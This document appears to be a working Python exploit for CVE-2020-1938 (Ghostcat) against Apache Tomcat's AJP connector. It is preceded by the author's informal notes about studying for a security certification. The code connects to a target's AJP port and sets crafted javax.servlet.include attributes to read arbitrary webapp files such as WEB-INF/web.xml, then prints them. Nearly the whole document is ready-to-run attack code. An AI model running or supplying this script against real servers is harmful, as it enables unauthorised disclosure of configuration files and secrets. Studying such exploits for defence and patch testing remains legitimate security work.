# @w4fz5uck5
# CVE-2020-1938-Clean-Version
#
# Notes:
# This exploit will NOT turn you able to get RCE / RFI.
#
# I guess at moment it's not possible also to bypass ROOT path(configured by default in servlet), which make this
# vulnerability now as a simple "read-webapps-files.py".. :(
#
# Personal notes:
# When i have seen for the first time this vulnerability, i was overthinking that it was a super hard to understand.
# As i'm studying to my OSWE certication, it should be a nice oportunity to learning more about web attacks right?..
# Well... now i'm depressed and realized that i lost my time trying to replicate that shit... :(
#
# So... at now i'm asking my self, HOW THIS SHITTY VULNERABILITY WAS HIDDEN BY THE LAST 13 YEARS?.. Really? What?!
# --------------------------------------------------------------------------------------------------------
# <snippet> 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file ....</snippet>
# -------------------------------------------------------------------------------------------------------
# BRAHHH!!... * insert meme audio here *
#
# Original POC SCRIPT:
# https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC/blob/master/poc.py
#
# Original SCRIPT which have "ORIGINAL" unusable functions utilized in the above "Original POC" ^^:
# https://github.com/hypn0s/AJPy
#
# References: https://tomcat.apache.org/tomcat-7.0-doc/servletapi/constant-values.html

from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from pprint import pprint, pformat

import socket
import argparse
import logging
import re
import os
from io import StringIO
import logging
from colorlog import ColoredFormatter
import urllib

def setup_logger():
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        reset=True,
        log_colors={
            'DEBUG': 'bold_purple',
            'INFO': 'bold_green',
            'WARNING': 'bold_yellow',
            'ERROR': 'bold_red',
            'CRITICAL': 'bold_red',
        }
    )

    logger = logging.getLogger('meow')
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    return logger

logger = setup_logger()

class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb", bufsize=0)

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
	    self.req_uri = req_uri
	    self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
	                                                       method=AjpForwardRequest.REQUEST_METHODS.get(method))
	    logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
	    if user is not None and password is not None:
	        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
	                "%s:%s" % (user, password)).encode('base64').replace('\n', '')

	    for h in headers:
	        self.forward_request.request_headers[h] = headers[h]

	    for a in attributes:
	        self.forward_request.attributes.append(a)

	    responses = self.forward_request.send_and_receive(self.socket, self.stream)
	    print(responses)
	    if len(responses) == 0:
	        return None, None

	    snd_hdrs_res = responses[0]

	    data_res = responses[1:-1]
	    if len(data_res) == 0:
	        logger.info("No data in response. Headers:\n %s" % pformat(vars(snd_hdrs_res)))

	    return snd_hdrs_res, data_res

# helpers
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False
    fr.attributes = []
    return fr

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('target', type=str, help="Hostname or IP to attack")
    parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
    parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
    args = parser.parse_args()
    bf = Tomcat(args.target, args.port)
    attributes = [
        {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},     # -->> ROOT slash? ("//index.jsp")
        {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file]}, # -->> BUG
        {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},    # -->> Maybe ROOT PATH bypass?
    ]
    snd_hdrs_res, data_res = bf.perform_request(req_uri='/',method='GET', attributes=attributes)
    print("".join([d.data for d in data_res]))

# Yes the full exploit ends here e-e
